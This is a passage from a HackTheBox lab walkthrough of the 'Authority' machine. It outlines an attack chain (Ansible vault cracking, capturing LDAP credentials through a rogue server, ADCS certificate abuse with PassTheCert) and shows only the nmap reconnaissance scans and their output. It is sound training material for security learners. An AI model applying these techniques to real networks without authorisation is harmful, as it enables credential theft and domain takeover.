
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authority - HTB</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
    <link href="/css/articles.css" rel="stylesheet">
    <link href="/css/styles.css" rel="stylesheet">
    <link href="/css/monokai.css" rel="stylesheet">
    <link href="/css/writeups.css" rel="stylesheet">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <aside class="sidebar">
                <div class="sidebar-logo">
                    <img src="/img/new-logo.png" alt="Logo">
                    <h3>elswix</h3>
                </div>
                <nav>
                    <ul class="nav flex-column">
                        <li class="nav-item"><a href="/" class="nav-link active"><i class="bi bi-house-door"></i> Home</a></li>
                        <li class="nav-item"><a href="/articles" class="nav-link"><i class="bi bi-card-text"></i> Articles</a></li>
                        <li class="nav-item"><a href="/writeups" class="nav-link"><i class="bi bi-terminal"></i> WriteUPs</a></li>
                        <li class="nav-item"><a href="/notes" class="nav-link"><i class="bi bi-journal-text"></i> Notes</a></li>
                        <li class="nav-item"><a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link"><i class="bi bi-github"></i> KL-Sunset</a></li>
                        <li class="nav-item"><a href="/about" class="nav-link"><i class="bi bi-person"></i> About me</a></li>
                    </ul>
                </nav>
            </aside>
            <!-- Main Content -->
            <main>
                <!-- Hero Section -->
                <section class="hero mb-5">
                    <img alt="index-logo" class="mb-3" style="width: 120px; height: 120px; border-radius: 50%" src="/writeups/htb/medium/authority/img/authority.png">
                <h2>Authority - HTB</h2>
                <p>walkthrough by elswix<p>
                <ul class="machine-links" style="display: none">
                    <li><a href="https://app.hackthebox.com/machines/Authority">HackTheBox</a></li>
                </ul>
            </section>
                <section class="article-content">
                    <div class="article-container">
                        <div class="article-content-main">                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Authority</span>
<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Medium</span>
<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">07</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2023</span>
</pre></div>
<h3><br/>About Authority</h3><br/>
Authority is a medium-difficulty machine on HackTheBox. Initially, we will decrypt Ansible vaults using the <code>ansible2john</code> tool to extract John hashes. Once we obtain the Vault password, we discover passwords that can be employed for authentication on the PWM website.<br/><br/>
<h3><br>Shell as svc_ldap</br></h3><br>
On the PWM website, we can modify certain configurations to trigger an LDAP request to our LDAP server and capture the LDAP authentication along with the password. This grants us access as <code>svc_ldap</code> by exploiting the <code>WinRM</code> service.<br/><br/>
<h3><br>Shell as Administrator</br></h3><br>
We identify a vulnerable template in ADCS. By adding a domain computer, we can exploit this vulnerability to obtain a PFX file of the administrator user. Using <code>PassTheCert</code>, we can bypass disabled Kerberos authentication.<br/><br/>
<h3><br>Recon</br></h3><br>
First, we will perform a port scan to identify open ports on the victim machine. To do this, we will use the <code>nmap</code> tool:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">n</span> <span class="mf">10.10.11.222</span> <span class="o">-</span><span class="n">oG</span> <span class="n">portScan</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.222</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.15</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">54255</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">),</span> <span class="mi">11251</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
<span class="n">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="k">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">domain</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">http</span>
<span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>
<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
<span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldap</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
<span class="mi">464</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">kpasswd5</span>
<span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span><span class="o">-</span><span class="n">rpc</span><span class="o">-</span><span class="n">epmap</span>
<span class="mi">636</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldapssl</span>
<span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">globalcatLDAP</span>
<span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">globalcatLDAPssl</span>
<span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">wsman</span>
<span class="mi">8443</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">https</span><span class="o">-</span><span class="n">alt</span>
<span class="mi">9389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">adws</span>
<span class="mi">47001</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">winrm</span>
<span class="mi">49664</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49665</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49666</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49667</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49675</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49688</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49689</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49691</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49692</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49701</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49702</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49711</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
<span class="mi">49730</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
</pre></div>

Once the initial scan is complete, we will conduct a comprehensive scan to analyze the technologies and services running on the identified open ports. For this purpose, we will continue using the <code>nmap</code> tool.<br/><br/>
Given that we exported the previous scan in the <code>-oG</code> format, we can utilize Regex to filter the results based on open ports:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">portScan</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">oP</span> <span class="s1">'\d{1,5}/open'</span> <span class="o">|</span> <span class="n">awk</span> <span class="s1">'{print $1}'</span> <span class="n">FS</span><span class="o">=</span><span class="s2">"/"</span> <span class="o">|</span> <span class="n">xargs</span> <span class="o">|</span> <span class="n">tr</span> <span class="s1">' '</span> <span class="s1">','</span>
<span class="mi">53</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">389</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">593</span><span class="p">,</span><span class="mi">636</span><span class="p">,</span><span class="mi">3268</span><span class="p">,</span><span class="mi">3269</span><span class="p">,</span><span class="mi">5985</span><span class="p">,</span><span class="mi">8443</span><span class="p">,</span><span class="mi">9389</span><span class="p">,</span><span class="mi">47001</span><span class="p">,</span><span class="mi">49664</span><span class="p">,</span><span class="mi">49665</span><span class="p">,</span><span class="mi">49666</span><span class="p">,</span><span class="mi">49667</span><span class="p">,</span><span class="mi">49675</span><span class="p">,</span><span class="mi">49688</span><span class="p">,</span><span class="mi">49689</span><span class="p">,</span><span class="mi">49691</span><span class="p">,</span><span class="mi">49692</span><span class="p">,</span><span class="mi">49701</span><span class="p">,</span><span class="mi">49702</span><span class="p">,</span><span class="mi">49711</span><span class="p">,</span><span class="mi">49730</span>
</pre></div>

Now, using the <code>nmap</code> tool, we will execute the comprehensive scan:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p53</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">389</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">593</span><span class="p">,</span><span class="mi">636</span><span class="p">,</span><span class="mi">3268</span><span class="p">,</span><span class="mi">3269</span><span class="p">,</span><span class="mi">5985</span><span class="p">,</span><span class="mi">8443</span><span class="p">,</span><span class="mi">9389</span><span class="p">,</span><span class="mi">47001</span><span class="p">,</span><span class="mi">49664</span><span class="p">,</span><span class="mi">49665</span><span class="p">,</span><span class="mi">49666</span><span class="p">,</span><span class="mi">49667</span><span class="p">,</span><span class="mi">49675</span><span class="p">,</span><span class="mi">49688</span><span class="p">,</span><span class="mi">49689</span><span class="p">,</span><span class="mi">49691</span><span class="p">,</span><span class="mi">49692</span><span class="p">,</span><span class="mi">49701</span><span class="p">,</span><span class="mi">49702</span><span class="p">,</span><span class="mi">49711</span><span class="p">,</span><span class="mi">49730</span> <span class="mf">10.10.11.222</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>

<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.222</span> <span class="p">(</span><span class="mf">10.10.11.222</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.56</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>

<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>       <span class="n">VERSION</span>
<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">domain</span>        <span class="n">Simple</span> <span class="n">DNS</span> <span class="n">Plus</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">http</span>          <span class="n">Microsoft</span> <span class="n">IIS</span> <span class="n">httpd</span> <span class="mf">10.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">IIS</span> <span class="n">Windows</span> <span class="n">Server</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> 
<span class="o">|</span><span class="n">_</span>  <span class="n">Potentially</span> <span class="n">risky</span> <span class="n">methods</span><span class="p">:</span> <span class="n">TRACE</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">10.0</span>
<span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>  <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Kerberos</span> <span class="p">(</span><span class="n">server</span> <span class="n">time</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">08</span> <span class="mi">17</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">04</span><span class="n">Z</span><span class="p">)</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>   <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
<span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldap</span>          <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Active</span> <span class="n">Directory</span> <span class="n">LDAP</span> <span class="p">(</span><span class="n">Domain</span><span class="p">:</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="p">,</span> <span class="n">Site</span><span class="p">:</span> <span class="n">Default</span><span class="o">-</span><span class="n">First</span><span class="o">-</span><span class="n">Site</span><span class="o">-</span><span class="n">Name</span><span class="p">)</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">08</span><span class="n">T17</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">21</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">4</span><span class="n">h00m00s</span> <span class="kn">from</span> <span class="nn">scanner</span> <span class="n">time</span><span class="o">.</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> 
<span class="o">|</span> <span class="n">Subject</span> <span class="n">Alternative</span> <span class="n">Name</span><span class="p">:</span> <span class="n">othername</span><span class="p">:</span> <span class="n">UPN</span><span class="p">::</span><span class="n">AUTHORITY</span><span class="err">$</span><span class="nd">@htb</span><span class="o">.</span><span class="n">corp</span><span class="p">,</span> <span class="n">DNS</span><span class="p">:</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span><span class="n">corp</span><span class="p">,</span> <span class="n">DNS</span><span class="p">:</span><span class="n">htb</span><span class="o">.</span><span class="n">corp</span><span class="p">,</span> <span class="n">DNS</span><span class="p">:</span><span class="n">HTB</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="n">T23</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">21</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2024</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="n">T23</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">21</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="err">?</span>
<span class="mi">464</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">kpasswd5</span><span class="err">?</span>
<span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ncacn_http</span>    <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span> <span class="n">over</span> <span class="n">HTTP</span> <span class="mf">1.0</span>
<span class="mi">636</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssl</span><span class="o">/</span><span class="n">ldap</span>      <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Active</span> <span class="n">Directory</span> <span class="n">LDAP</span> <span class="p">(</span><span class="n">Domain</span><span class="p">:</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="p">,</span> <span class="n">Site</span><span class="p">:</span> <span class="n">Default</span><span class="o">-</span><span class="n">First</span><span class="o">-</span><span class="n">Site</span><span class="o">-</span><span class="n">Name</span><span class="p">)</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">08</span><span class="n">T17</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">20</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">4</span><span class="n">h00m00s</span> <span class="kn">from</span> <span class="nn">scanner</span> <span class="n">time</span><span class="o">.</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> 
<span class="o">|</span> <span class="n">Subject</span> <span class="n">Alternative</span> <span class="n">Name</span><span class="p">:</span> <span class="n">othername</span><span class="p">:</span> <span class="n">UPN</span><span class="p">::</span><span class="n">AUTHORITY</span><span class="err">$</span><span class="nd">@htb</span><span class="o">.</span><span class="n">corp</span><span class="p">,</span> <span class="n">DNS</span><span class="p">:</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span><span class="n">corp</span><span class="p">,</span> <span class="n">DNS</span><span class="p">:</span><span class="n">htb</span><span class="o">.</span><span class="n">corp</span><span class="p">,</span> <span class="n">DNS</span><span class="p">:</span><span class="n">HTB</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="n">T23</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">21</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2024</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="n">T23</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">21</span>
<span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ldap</span>          <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Active</span> <span class="n">Directory</span> <span class="n">LDAP</span> <span class="p">(</span><span class="n">Domain</span><span class="p">:</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="p">,</span> <span class="n">Site</span><span class="p">:</span> <span class="n">Default</span><span class="o">-</span><span class="n">First</span><span class="o">-</span><span class="n">Site</span><span class="o">-</span><span class="n">Name</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> 
<span class="o">|</span> <span class="n">Subject</span> <span class="n">Alternative</span> <span class="n">Name</span><span class="p">:</span> <span class="n">othername</span><span class="p">:</span> <span class="n">UPN</span><span class="p">::</span><span class="n">AUTHORITY</span><span class="err">$</span><span class="nd">@htb</span><span class="o">.</span><span class="n">corp</span><span class="p">,</span> <span class="n">DNS</span><span class="p">:</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span><span class="n">corp</span><span class="p">,</span> <span class="n">DNS</span><span class="p">:</span><span class="n">htb</span><span class="o">.</span><span class="n">corp</span><span class="p">,</span> <span class="n">DNS</span><span class="p">:</span><span class="n">HTB</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="n">T23</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">21</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2024</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="n">T23</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">21</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">08</span><span class="n">T17</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">21</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">4</span><span class="n">h00m00s</span> <span class="kn">from</span> <span class="nn">scanner</span> <span class="n">time</span><span class="o">.</span>
<span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ssl</span><span class="o">/</span><span class="n">ldap</span>      <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Active</span> <span class="n">Directory</span> <span class="n">LDAP</span> <span class="p">(</span><span class="n">Domain</span><span class="p">:</span> <span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="p">,</span> <span class="n">Site</span><span class="p">:</span> <span class="n">Default</span><span class="o">-</span><span class="n">First</span><span class="o">-</span><span class="n">Site</span><span class="o">-</span><span class="n">Name</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> 
<span class="o">|</span> <span class="n">Subject</span> <span class="n">Alternative</span> <span class="n">Name</span><span class="p">:</span> <span class="n">othername</span><span class="p">:</span> <span class="n">UPN</span><span class="p">::</span><span class="n">AUTHORITY</span><span class="err">$</span><span class="nd">@htb</span><span class="o">.</span><span class="n">corp</span><span class="p">,</span> <span class="n">DNS</span><span class="p">:</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span><span class="n">corp</span><span class="p">,</span> <span class="n">DNS</span><span class="p">:</span><span class="n">htb</span><span class="o">.</span><span class="n">corp</span><span class="p">,</span> <span class="n">DNS</span><span class="p">:</span><span class="n">HTB</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="n">T23</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">21</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2024</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">09</span><span class="n">T23</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">21</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">08</span><span class="n">T17</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">20</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">4</span><span class="n">h00m00s</span> <span class="kn">from</span> <span class="nn">scanner</span> <span class="n">time</span><span class="o">.</span>
<span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>          <span class="n">Microsoft</span> <span class="n">HTTPAPI</span> <span class="n">httpd</span> <span class="mf">2.0</span> <span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mf">2.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Not</span> <span class="n">Found</span>
<span class="mi">8443</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ssl</span><span class="o">/</span><span class="n">https</span><span class="o">-</span><span class="n">alt</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesn</span><span class="s1">'t have a title (text/html;charset=ISO-8859-1).</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="mf">172.16.2.118</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">06</span><span class="n">T17</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2025</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">08</span><span class="n">T04</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">28</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="n">TLS</span> <span class="n">randomness</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">represent</span> <span class="n">time</span>
<span class="o">|</span> <span class="n">fingerprint</span><span class="o">-</span><span class="n">strings</span><span class="p">:</span> 
<span class="o">|</span>   <span class="n">FourOhFourRequest</span><span class="p">:</span> 
<span class="o">|</span>     <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> 
<span class="o">|</span>     <span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">ISO</span><span class="o">-</span><span class="mi">8859</span><span class="o">-</span><span class="mi">1</span>
<span class="o">|</span>     <span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">82</span>
<span class="o">|</span>     <span class="n">Date</span><span class="p">:</span> <span class="n">Fri</span><span class="p">,</span> <span class="mi">08</span> <span class="n">Dec</span> <span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">14</span> <span class="n">GMT</span>
<span class="o">|</span>     <span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
<span class="o">|</span>     <span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">meta</span> <span class="n">http</span><span class="o">-</span><span class="n">equiv</span><span class="o">=</span><span class="s2">"refresh"</span> <span class="n">content</span><span class="o">=</span><span class="s2">"0;URL='/pwm'"</span><span class="o">/&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
<span class="o">|</span>   <span class="n">GetRequest</span><span class="p">:</span> 
<span class="o">|</span>     <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> 
<span class="o">|</span>     <span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">ISO</span><span class="o">-</span><span class="mi">8859</span><span class="o">-</span><span class="mi">1</span>
<span class="o">|</span>     <span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">82</span>
<span class="o">|</span>     <span class="n">Date</span><span class="p">:</span> <span class="n">Fri</span><span class="p">,</span> <span class="mi">08</span> <span class="n">Dec</span> <span class="mi">2023</span> <span class="mi">17</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">11</span> <span class="n">GMT</span>
